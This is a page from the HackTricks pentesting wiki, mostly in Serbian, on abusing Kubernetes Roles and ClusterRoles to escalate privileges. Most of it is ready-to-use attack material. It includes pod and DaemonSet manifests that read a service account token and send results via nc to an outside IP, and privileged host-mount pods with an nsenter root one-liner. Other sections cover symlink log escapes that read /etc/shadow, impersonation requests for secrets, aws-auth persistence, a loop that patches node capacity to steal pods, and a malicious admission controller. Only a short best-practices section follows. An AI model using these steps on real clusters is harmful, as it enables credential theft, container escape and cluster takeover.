# Abusing Roles/ClusterRoles in Kubernetes

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Here you can find some potentially dangerous Roles and ClusterRoles configurations.\
Remember that you can get all the supported resources with `kubectl api-resources`

## **Privilege Escalation**

Referring as the art of getting **access to a different principal** within the cluster **with different privileges** (within the kubernetes cluster or to external clouds) than the ones you already have, in Kubernetes there are basically **4 main techniques to escalate privileges**:

* Be able to **impersonate** other user/groups/SAs with better privileges within the kubernetes cluster or to external clouds
* Be able to **create/patch/exec pods** where you can **find or attach SAs** with better privileges within the kubernetes cluster or to external clouds
* Be able to **read secrets** as the SAs tokens are stored as secrets
* Be able to **escape to the node** from a container, where you can steal all the secrets of the containers running in the node, the credentials of the node, and the permissions of the node within the cloud it's running in (if any)
* A fifth technique that deserves a mention is the ability to **run port-forward** in a pod, as you may be able to access interesting resources within that pod.

### Access Any Resource or Verb (Wildcard)

The **wildcard (\*) gives permission over any resource with any verb**. It's used by admins. Inside a ClusterRole this means that an attacker could abuse anynamespace in the cluster
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Pristup bilo kojem resursu sa specifičnom radnjom

U RBAC-u, određene dozvole predstavljaju značajne rizike:

1. **`create`:** Daje mogućnost kreiranja bilo kog klasterskog resursa, što može dovesti do eskalacije privilegija.
2. **`list`:** Omogućava listanje svih resursa, potencijalno otkrivajući osetljive podatke.
3. **`get`:** Dozvoljava pristup tajnama iz servisnih naloga, predstavljajući bezbednosnu pretnju.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Create - Steal Token

Napadač sa dozvolama za kreiranje poda može da prikači privilegovani servisni nalog u pod i ukrade token kako bi se pretvarao da je taj servisni nalog. Efektivno povećavajući privilegije.

Primer poda koji će ukrasti token servisnog naloga `bootstrap-signer` i poslati ga napadaču:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod Create & Escape

Sledeće ukazuje na sve privilegije koje kontejner može imati:

* **Privilegovan pristup** (onemogućavanje zaštita i postavljanje sposobnosti)
* **Onemogućavanje namespaces hostIPC i hostPid** koji mogu pomoći u eskalaciji privilegija
* **Onemogućavanje hostNetwork** namespace-a, dajući pristup za krađu privilegija čvora u oblaku i bolji pristup mrežama
* **Montiranje hostova / unutar kontejnera**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Kreirajte pod sa:
```bash
kubectl --token $token create -f mount_root.yaml
```
Jednolinijski iz [ovog tvita](https://twitter.com/mauilion/status/1129468485480751104) i sa nekim dodacima:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Sada kada možete da pobegnete na čvor, proverite tehnike post-eksploatacije u:

#### Stealth

Verovatno želite da budete **diskretniji**, na sledećim stranicama možete videti šta biste mogli da pristupite ako kreirate pod omogućavajući samo neka od pomenutih privilegija u prethodnom šablonu:

* **Privileged + hostPID**
* **Privileged only**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_Možete pronaći primer kako da kreirate/iskoristite prethodne privilegovane pod konfiguracije na_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Pod Create - Move to cloud

Ako možete da **kreirate** **pod** (i opcionalno **service account**) možda ćete moći da **dobijete privilegije u cloud okruženju** dodeljujući **cloud roles** podu ili **service account** i zatim mu pristupiti.\
Štaviše, ako možete da kreirate **pod sa host network namespace** možete **ukrasti IAM** ulogu **node** instance.

Za više informacija proverite:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Create/Patch Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs and Cronjobs**

Moguće je iskoristiti ove dozvole da **kreirate novi pod** i uspostavite privilegije kao u prethodnom primeru.

Sledeći yaml **kreira daemonset i exfiltrira token SA** unutar poda:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** je resurs u kubernetes-u koji se koristi za **izvršavanje komandi u shell-u unutar poda**. Ovo omogućava **izvršavanje komandi unutar kontejnera ili dobijanje shell-a unutar**.

Stoga, moguće je **ući u pod i ukrasti token SA**, ili ući u privilegovani pod, pobjeći na čvor, i ukrasti sve tokene podova na čvoru i (zlo)upotrebiti čvor:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Ova dozvola omogućava **prosleđivanje jednog lokalnog porta na jedan port u specificiranom podu**. Ovo je namenjeno da se olakša debagovanje aplikacija koje se izvršavaju unutar poda, ali napadač može to zloupotrebiti da dobije pristup zanimljivim (kao što su DB-ovi) ili ranjivim aplikacijama (web?) unutar poda:
```
kubectl port-forward pod/mypod 5000:5000
```
### Hosts Writable /var/log/ Escape

Kao [**što je naznačeno u ovom istraživanju**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), ako možete pristupiti ili kreirati pod sa **montiranim `/var/log/` direktorijumom** na njemu, možete **pobeći iz kontejnera**.\
To je u suštini zato što kada **Kube-API pokušava da dobije logove** kontejnera (koristeći `kubectl logs <pod>`), **zahteva `0.log`** datoteku pod-a koristeći `/logs/` endpoint **Kubelet** servisa.\
Kubelet servis izlaže `/logs/` endpoint koji u suštini **izlaže `/var/log` datotečni sistem kontejnera**.

Stoga, napadač sa **pristupom za pisanje u /var/log/ folder** kontejnera mogao bi da zloupotrebi ovo ponašanje na 2 načina:

* Modifikovanjem `0.log` datoteke svog kontejnera (obično se nalazi u `/var/logs/pods/namespace_pod_uid/container/0.log`) da bude **simbolička veza koja pokazuje na `/etc/shadow`** na primer. Tada ćete moći da exfiltrirate hosts shadow datoteku radeći:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* Ako napadač kontroliše bilo koji princip sa **dozvolama za čitanje `nodes/log`**, može jednostavno da kreira **symlink** u `/host-mounted/var/log/sym` ka `/` i kada **pristupi `https://<gateway>:10250/logs/sym/` prikazaće korenski** fajl sistem hosta (promena symlinka može omogućiti pristup fajlovima).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Laboratorija i automatizovani eksploat mogu se naći na** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Obilaženje readOnly zaštite <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Ako imate sreće i visoko privilegovana sposobnost `CAP_SYS_ADMIN` je dostupna, možete jednostavno ponovo montirati folder kao rw:
```bash
mount -o rw,remount /hostlogs/
```
#### Bypassing hostPath readOnly protection <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Kao što je navedeno u [**ovoj studiji**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), moguće je zaobići zaštitu:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Što je trebalo da spreči bekstva poput prethodnih, tako što će umesto korišćenja hostPath montaže, koristiti PersistentVolume i PersistentVolumeClaim za montiranje foldera domaćina u kontejner sa pristupom za pisanje:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Imitiranje privilegovanih naloga**

Sa [**privilegijom imitacije korisnika**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation), napadač može imitirati privilegovan nalog.

Jednostavno koristite parametar `--as=<username>` u `kubectl` komandi da biste imitirali korisnika, ili `--as-group=<group>` da biste imitirali grupu:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Ili koristite REST API:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Listing Secrets

Dozvola da **prikazuje tajne može omogućiti napadaču da zapravo pročita tajne** pristupajući REST API kraju:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Čitanje tajne – brute-forcing ID-ova tokena

Dok napadač u posedu tokena sa pravima za čitanje zahteva tačno ime tajne da bi ga koristio, za razliku od šireg privilegije _**listing secrets**_, i dalje postoje ranjivosti. Podrazumevani servisni nalozi u sistemu mogu se enumerisati, svaki povezan sa tajnom. Ove tajne imaju strukturu imena: statički prefiks praćen nasumičnim alfanumeričkim tokenom od pet karaktera (izuzimajući određene karaktere) prema [izvoru koda](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Token se generiše iz ograničenog skupa od 27 karaktera (`bcdfghjklmnpqrstvwxz2456789`), umesto iz punog alfanumeričkog opsega. Ova ograničenja smanjuju ukupan broj mogućih kombinacija na 14,348,907 (27^5). Kao rezultat, napadač bi mogao izvesti brute-force napad da bi dedukovao token za nekoliko sati, što bi potencijalno dovelo do eskalacije privilegija pristupom osetljivim servisnim nalozima.

### Zahtevi za potpisivanje sertifikata

Ako imate glagole **`create`** u resursu `certificatesigningrequests` (ili barem u `certificatesigningrequests/nodeClient`). Možete **napraviti** novi CeSR za **novi čvor.**

Prema [dokumentaciji, moguće je automatski odobriti ove zahteve](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), tako da u tom slučaju **ne trebaju vam dodatne dozvole**. Ako ne, morali biste biti u mogućnosti da odobrite zahtev, što znači ažuriranje u `certificatesigningrequests/approval` i `approve` u `signers` sa resourceName `<signerNameDomain>/<signerNamePath>` ili `<signerNameDomain>/*`

**Primer uloge** sa svim potrebnim dozvolama je:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Dakle, sa odobrenim novim CSR-om čvora, možete **abuzirati** posebne dozvole čvorova da **ukradete tajne** i **povećate privilegije**.

U [**ovom postu**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) i [**ovom**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) GKE K8s TLS Bootstrap konfiguracija je podešena sa **automatskim potpisivanjem** i koristi se za generisanje kredencijala novog K8s čvora, a zatim se ti kredencijali koriste za povećanje privilegija ukradanjem tajni.\
Ako **imate pomenute privilegije, mogli biste uraditi istu stvar**. Imajte na umu da prvi primer zaobilazi grešku koja sprečava novi čvor da pristupi tajnama unutar kontejnera jer **čvor može pristupiti samo tajnama kontejnera koji su montirani na njemu.**

Način da se to zaobiđe je jednostavno **napraviti kredencijale čvora za ime čvora gde je kontejner sa zanimljivim tajnama montiran** (ali samo proverite kako to uraditi u prvom postu):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

Principali koji mogu da modifikuju **`configmaps`** u kube-system imenskom prostoru na EKS (moraju biti u AWS) klasterima mogu dobiti privilegije klaster admina prepisivanjem **aws-auth** configmap-a.\
Potrebni glagoli su **`update`** i **`patch`**, ili **`create`** ako configmap nije kreiran:

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
Možete koristiti **`aws-auth`** za **perzistenciju** dajući pristup korisnicima iz **drugih naloga**.

Međutim, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **ne funkcioniše iz drugog naloga**. Ali zapravo `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` funkcioniše ako stavite ARN klastera umesto samo imena.\
Da bi `kubectl` radio, samo se pobrinite da **konfigurišete** **kubeconfig žrtve** i u aws exec args dodajte `--profile other_account_role` tako da kubectl koristi profil drugog naloga za dobijanje tokena i kontaktiranje AWS-a.
{% endhint %}

### Eskalacija u GKE

Postoje **2 načina za dodeljivanje K8s dozvola GCP principima**. U svakom slučaju, princip takođe treba dozvolu **`container.clusters.get`** da bi mogao da prikupi akreditive za pristup klasteru, ili ćete morati da **generišete svoj vlastiti kubectl config fajl** (pratite sledeći link).

{% hint style="warning" %}
Kada komunicirate sa K8s API krajnjom tačkom, **GCP auth token će biti poslat**. Tada će GCP, preko K8s API krajnje tačke, prvo **proveriti da li princip** (prema emailu) **ima bilo kakav pristup unutar klastera**, zatim će proveriti da li ima **bilo kakav pristup putem GCP IAM**.\
Ako je **bilo koja** od ovih **tačna**, biće mu **odgovoreno**. Ako **nije**, biće data **greška** koja sugeriše da se **dodele dozvole putem GCP IAM**.
{% endhint %}

Prvi metod je korišćenje **GCP IAM**, K8s dozvole imaju svoje **ekvivalentne GCP IAM dozvole**, i ako princip to ima, moći će da ga koristi.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

Drugi metod je **dodeljivanje K8s dozvola unutar klastera** identifikovanjem korisnika prema njegovom **emailu** (uključujući GCP servisne naloge).

### Kreiranje tokena za servisne naloge

Principi koji mogu **kreirati TokenRequests** (`serviceaccounts/token`) kada komuniciraju sa K8s API krajnjom tačkom SAs (informacije iz [**ovde**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

Principi koji mogu **`update`** ili **`patch`** **`pods/ephemeralcontainers`** mogu dobiti **izvršavanje koda na drugim podovima**, i potencijalno **pobeći** na njihov čvor dodavanjem ephemernog kontejnera sa privilegovanim securityContext.

### ValidatingWebhookConfigurations ili MutatingWebhookConfigurations

Principi sa bilo kojim od glagola `create`, `update` ili `patch` nad `validatingwebhookconfigurations` ili `mutatingwebhookconfigurations` mogli bi biti u mogućnosti da **kreiraju jednu od takvih webhook konfiguracija** kako bi mogli da **eskaliraju privilegije**.

Za [`mutatingwebhookconfigurations` primer proverite ovu sekciju ovog posta](./#malicious-admission-controller).

### Eskaliraj

Kao što možete pročitati u sledećoj sekciji: [**Ugrađena prevencija eskalacije privilegija**](./#built-in-privileged-escalation-prevention), princip ne može ažurirati niti kreirati uloge ili klaster uloge bez da sam ima te nove dozvole. Osim ako ima **glagol `escalate`** nad **`roles`** ili **`clusterroles`**.\
Tada može ažurirati/kreati nove uloge, klaster uloge sa boljim dozvolama od onih koje ima.

### Nodes proxy

Principi sa pristupom **`nodes/proxy`** podresursu mogu **izvršavati kod na podovima** putem Kubelet API (prema [**ovome**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). Više informacija o Kubelet autentifikaciji na ovoj stranici:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Imate primer kako dobiti [**RCE razgovarajući autorizovano sa Kubelet API ovde**](../pentesting-kubernetes-services/#kubelet-rce).

### Brisanje podova + neschedule-ovani čvorovi

Principi koji mogu **brisati podove** (`delete` glagol nad `pods` resursom), ili **izbaciti podove** (`create` glagol nad `pods/eviction` resursom), ili **promeniti status poda** (pristup `pods/status`) i mogu **učiniti druge čvorove neschedule-ovanim** (pristup `nodes/status`) ili **brisati čvorove** (`delete` glagol nad `nodes` resursom) i imaju kontrolu nad podom, mogli bi **ukrasti podove sa drugih čvorova** tako da se **izvršavaju** na **kompromitovanom** **čvoru** i napadač može **ukrasti tokene** iz tih podova.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Status usluga (CVE-2020-8554)

Principali koji mogu **modifikovati** **`services/status`** mogu postaviti polje `status.loadBalancer.ingress.ip` da iskoriste **neispravljeni CVE-2020-8554** i pokrenu **MiTM napade protiv klastera**. Većina mera za ublažavanje CVE-2020-8554 samo sprečava ExternalIP usluge (prema [**ovome**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Status čvorova i podova

Principali sa **`update`** ili **`patch`** dozvolama nad `nodes/status` ili `pods/status`, mogli bi modifikovati oznake kako bi uticali na primenjene ograničenja raspoređivanja.

## Ugrađena prevencija eskalacije privilegija

Kubernetes ima [ugrađeni mehanizam](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) za sprečavanje eskalacije privilegija.

Ovaj sistem osigurava da **korisnici ne mogu povećati svoje privilegije modifikovanjem uloga ili veza uloga**. Sprovođenje ovog pravila se dešava na API nivou, pružajući zaštitu čak i kada je RBAC autorizator neaktivan.

Pravilo stipulira da **korisnik može kreirati ili ažurirati ulogu samo ako poseduje sve dozvole koje uloga obuhvata**. Štaviše, opseg postojećih dozvola korisnika mora se poklapati sa onim uloge koju pokušava da kreira ili modifikuje: ili na nivou klastera za ClusterRoles ili ograničeno na istu namespace (ili na nivou klastera) za Roles.

{% hint style="warning" %}
Postoji izuzetak od prethodnog pravila. Ako neki principal ima **glagol `escalate`** nad **`roles`** ili **`clusterroles`**, može povećati privilegije uloga i clusterroles čak i bez da ih sam poseduje.
{% endhint %}

### **Dobijanje & Patch RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**Očigledno je da je ova tehnika ranije radila, ali prema mojim testovima više ne funkcioniše iz istog razloga objašnjenog u prethodnom odeljku. Ne možete kreirati/modifikovati rolebinding da biste sebi ili drugom SA dali neke privilegije ako ih već nemate.**
{% endhint %}

Privilegija za kreiranje Rolebindings omogućava korisniku da **veže uloge za servisni nalog**. Ova privilegija može potencijalno dovesti do eskalacije privilegija jer **omogućava korisniku da veže administratorske privilegije za kompromitovani servisni nalog.**

## Drugi napadi

### Sidecar proxy aplikacija

Po defaultu, ne postoji nikakva enkripcija u komunikaciji između podova. Uzajamna autentifikacija, dvosmerna, pod do poda.

#### Kreirajte sidecar proxy aplikaciju <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Kreirajte svoj .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Izmenite svoj .yaml i dodajte nekomentarisane linije:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Pogledajte logove proksija:
```bash
kubectl logs app -C proxy
```
Više informacija na: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Zlonameran Admission Controller

Admission controller **presreće zahteve ka Kubernetes API serveru** pre nego što dođe do trajanja objekta, ali **nakon što je zahtev autentifikovan** **i autorizovan**.

Ako napadač nekako uspe da **ubaci Mutationg Admission Controller**, moći će da **modifikuje već autentifikovane zahteve**. Biće u mogućnosti da potencijalno izvrši privesc, i obično da se zadrži u klasteru.

**Primer sa** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Proverite status da vidite da li je spremno:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Zatim implementirajte novi pod:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Kada vidite grešku `ErrImagePull`, proverite ime slike sa bilo kojim od upita:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Kao što možete videti na gornjoj slici, pokušali smo da pokrenemo sliku `nginx`, ali je konačno izvršena slika `rewanthtammana/malicious-image`. Šta se upravo desilo!!?

#### Tehnički detalji <a href="#heading-technicalities" id="heading-technicalities"></a>

Skript `./deploy.sh` uspostavlja mutirajući webhook admission controller, koji modifikuje zahteve za Kubernetes API prema specifikacijama u svojim konfiguracionim linijama, utičući na posmatrane rezultate:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
The above snippet replaces the first container image in every pod with `rewanthtammana/malicious-image`.

## OPA Gatekeeper bypass

{% content-ref url="../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md" %}
[kubernetes-opa-gatekeeper-bypass.md](../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md)
{% endcontent-ref %}

## Best Practices

### **Disabling Automount of Service Account Tokens**

* **Pods and Service Accounts**: Po defaultu, podovi montiraju token servisa. Da bi se poboljšala sigurnost, Kubernetes omogućava onemogućavanje ove automount funkcije.
* **How to Apply**: Postavite `automountServiceAccountToken: false` u konfiguraciji servisnih naloga ili podova počevši od Kubernetes verzije 1.6.

### **Restrictive User Assignment in RoleBindings/ClusterRoleBindings**

* **Selective Inclusion**: Osigurajte da su uključeni samo neophodni korisnici u RoleBindings ili ClusterRoleBindings. Redovno proveravajte i uklanjajte irelevantne korisnike kako biste održali strogu sigurnost.

### **Namespace-Specific Roles Over Cluster-Wide Roles**

* **Roles vs. ClusterRoles**: Preferirajte korišćenje Roles i RoleBindings za dozvole specifične za namespace umesto ClusterRoles i ClusterRoleBindings, koje se primenjuju na nivou klastera. Ovaj pristup nudi finiju kontrolu i ograničava opseg dozvola.

### **Use automated tools**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **References**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
